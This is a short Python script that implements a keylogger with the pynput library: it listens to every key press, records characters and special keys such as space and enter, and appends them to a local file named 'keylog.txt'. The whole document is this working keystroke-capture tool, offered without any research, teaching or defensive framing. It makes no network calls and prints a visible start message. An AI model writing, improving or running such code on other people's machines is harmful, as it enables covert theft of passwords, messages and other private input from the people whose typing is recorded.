import pynput.keyboard
import threading

class Keylogger:
    def __init__(self, log_file="keylog.txt"):
        self.log_file = log_file
        self.log = ""

    def on_press(self, key):
        try:
            self.log += key.char
        except AttributeError:
            # Handle special keys
            if key == pynput.keyboard.Key.space:
                self.log += " "
            elif key == pynput.keyboard.Key.enter:
                self.log += "\\n"
            else:
                self.log += " [" + str(key) + "] "

        # Write to file after each key press for persistence
        with open(self.log_file, "a") as f:
            f.write(self.log)
        self.log = ""

    def start(self):
        with pynput.keyboard.Listener(on_press=self.on_press) as listener:
            listener.join()

if __name__ == "__main__":
    print("Starting keylogger... Press Ctrl+C to stop.")
    keylogger = Keylogger()
    keylogger.start()

